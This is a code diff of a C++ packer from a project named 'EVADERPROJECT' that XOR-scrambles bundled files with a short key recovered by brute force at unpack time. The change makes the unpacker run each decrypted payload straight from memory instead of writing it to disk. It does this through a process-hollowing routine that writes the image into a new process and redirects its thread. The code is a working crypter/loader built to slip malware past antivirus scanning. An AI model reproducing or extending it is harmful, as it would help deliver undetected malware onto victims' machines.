@@ -1,13 +1,5 @@
 #include "packroutines.h"
 
-#define KEY_SIZE 3
-#define STARTASCII 65
-#define ENDASCII 91
-char key[KEY_SIZE];
-char mainsignature[] = "EVADERPROJECT";
-//char* _image_;
-
-
 const char* packerrors_str[] = {
 	"Success",
 	"Archive empty; no files to extract",
@@ -18,8 +10,14 @@ const char* packerrors_str[] = {
 	"Input archive file failed to open"
 };
 
+char* key;
+char mainsignature[] = "EVADERPROJECT";
 
-int packfilesEx(char* path, char* mask, char* archive, packcallbacks_t* pcb) {
+int KEY_SIZE;
+int START_ASCII;
+int END_ASCII;
+
+int packfilesEx(char* path, char* mask, char* archive, int KEYSIZE, int STARTASCII, int ENDASCII, packcallbacks_t* pcb) {
 
 	TCHAR szCurDir[MAX_PATH];
 
@@ -42,12 +40,16 @@ int packfilesEx(char* path, char* mask, char* archive, packcallbacks_t* pcb) {
 	char SIG[13];
 	long nfiles;
 
+	KEY_SIZE = KEYSIZE;
+	START_ASCII = STARTASCII;
+	END_ASCII = ENDASCII;
+
 	// set a random key
+	key = new char[KEY_SIZE]();
 	setKey(key, KEY_SIZE);
-	for (int i = 0; i < sizeof(SIG); i++){
+
+	for (int i = 0; i < sizeof(SIG); i++)
 		SIG[i] = mainsignature[i] ^ key[i % sizeof(key) / sizeof(char)];
-		std::cout << SIG[i];
-	}
 		
 		
 	do {
@@ -70,6 +72,11 @@ int packfilesEx(char* path, char* mask, char* archive, packcallbacks_t* pcb) {
 	FILE* fpArchive = fopen(archive, "wb");
 
 	if (!fpArchive) return packerrorCannotCreateArchive;
+
+	// write key length and complexcity
+	fwrite(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
+	fwrite(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
+	fwrite(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
 
 	fwrite(SIG, sizeof(char), sizeof(SIG), fpArchive);
 
@@ -117,8 +124,8 @@ int packfilesEx(char* path, char* mask, char* archive, packcallbacks_t* pcb) {
 
 }
 
-int packfiles(char* path, char* mask, char* archive) {
-	return packfilesEx(path, mask, archive, NULL);
+int packfiles(char* path, char* mask, char* archive, int KEYSIZE, int STARTASCII, int ENDASCII) {
+	return packfilesEx(path, mask, archive, KEYSIZE, STARTASCII, ENDASCII, NULL);
 }
 
 int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {
@@ -128,6 +135,7 @@ int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, l
 int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {
 
 	FILE* fpArchive = fopen(archive, "rb");
+	
 
 	if (!fpArchive) return packerrorCouldNotOpenArchive;
 
@@ -137,19 +145,16 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 	if (startPos)
 		fseek(fpArchive, startPos, SEEK_SET);
 
+	// read key length and complexcity
+	fread(&KEY_SIZE, sizeof(KEY_SIZE), 1, fpArchive);
+	fread(&START_ASCII, sizeof(START_ASCII), 1, fpArchive);
+	fread(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
+	key = new char[KEY_SIZE]();
+
 	// read signature
 	fread(SIG, sizeof(char), sizeof(SIG), fpArchive);
 
-	for (int i = 0; i < sizeof(SIG); i++)
-		std::cout << SIG[i];
-
-
 	if (!retrieveKey(SIG, sizeof(SIG))) return (fclose(fpArchive), packerrorNotAPackedFile);
-
-	for (int i = 0; i < KEY_SIZE; i++)
-		std::cout << key[i];
-	//std::cout << "\nsuccess";
-	//Sleep(2000);
 
 	// read files entries count
 	fread(&nFiles, sizeof(nFiles), 1, fpArchive);
@@ -175,19 +180,13 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 
 		strcpy_s(buffer, dest);
 		strcat_s(buffer, pdata->filename);
-		fpOut = fopen(buffer, "wb");
-
-		if (!fpOut)
-			return (fclose(fpArchive), packerrorExtractError);
 
 		// how many chunks of Buffer_Size is there is in filesize?
 		long size = pdata->filesize;
-		long siz = pdata->filesize;
 		long pos = 0;
 		long read = 0;
 
 		char* _image_ = new char[size*2]();
-		//char _image_[] = "aaa";
 
 		while (size > 0){
 
@@ -198,7 +197,6 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 				buffer[i] = buffer[i] ^ key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
 			}
 			read += toread;
-			fwrite(buffer, toread, 1, fpOut);
 			pos += toread;
 			size -= toread;
 			if (pcb && pcb->fileprogress)
@@ -206,26 +204,20 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 				
 		}
 
-		fclose(fpOut);
-
+		// Run payload from memory
 		RunPortableExecutable(_image_);
-
 		nFiles--;
-
 	}
 
-
 	fclose(fpArchive);
-
-	
 
 	return packerrorSuccess;
 
 }
 
 
-int SfxGetInsertPos(char *filename, long *pos)
-{
+int SfxGetInsertPos(char *filename, long *pos){
+
 	FILE *fp = fopen(filename, "rb");
 	if (fp == NULL)
 		return packerrorCouldNotOpenArchive;
@@ -238,8 +230,8 @@ int SfxGetInsertPos(char *filename, long *pos)
 	return packerrorSuccess;
 }
 
-int SfxSetInsertPos(char *filename, long pos)
-{
+int SfxSetInsertPos(char *filename, long pos){
+
 	FILE *fp = fopen(filename, "rb+");
 	if (fp == NULL)
 		return packerrorCouldNotOpenArchive;
@@ -262,20 +254,14 @@ int SfxSetInsertPos(char *filename, long pos)
 
 void setKey(char* key, int key_size) {
 
-	/*
-	static const char alphanum[] =
-		"!@#$%^&*()"
-		"0123456789"
-		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-		"abcdefghijklmnopqrstuvwxyz";
-	*/
-
 	srand(time(NULL));
 
+	std::cout << "encryption key : ";
 	for (int i = 0; i < key_size; ++i) {
-		key[i] = char(STARTASCII + rand() % (ENDASCII - STARTASCII + 1));
+		key[i] = char(START_ASCII + rand() % (END_ASCII - START_ASCII + 1));
 		std::cout << key[i];
 	}
+
 	std::cout << "\n";
 
 }
@@ -288,14 +274,13 @@ bool retrieveKey(char* readSignature, int signatureSize) {
 	int i = KEY_SIZE;
 
 	for (int k = 0; k < KEY_SIZE; k++)
-		key[k] = STARTASCII;
+		key[k] = START_ASCII;
 
 	while (i > -1) {
 
-		for (int i = 0; i < signatureSize; i++) { // for loop for scrambing bits in the string 
+		for (int i = 0; i < signatureSize; i++) // for loop for scrambing bits in the string 
 			retrievedSig[i] = readSignature[i] ^ (char)key[i % sizeof(key) / sizeof(char)]; // scrambling/descrambling string
-			//std::cout << retrievedSig[i];
-		}
+
 		retrievedSig[signatureSize] = '\0';
 
 		if (!strcmp(retrievedSig, mainsignature)) return 1;
@@ -303,9 +288,9 @@ bool retrieveKey(char* readSignature, int signatureSize) {
 		i = KEY_SIZE - 1;
 		key[i]++;
 
-		while ((int)key[i] > ENDASCII) {
+		while ((int)key[i] > END_ASCII) {
 			
-			key[i] = STARTASCII;
+			key[i] = START_ASCII;
 			key[--i]++;
 		}
 
@@ -356,8 +341,6 @@ int RunPortableExecutable(HANDLE Image) {
 
 				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
 
-				
-
 				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {
 
 					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
@@ -367,7 +350,6 @@ int RunPortableExecutable(HANDLE Image) {
 
 				}
 
-
 				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
 					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
 
@@ -375,7 +357,6 @@ int RunPortableExecutable(HANDLE Image) {
 				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
 
 				ResumeThread(PI.hThread);
-				
 
 				return 0;
 			}
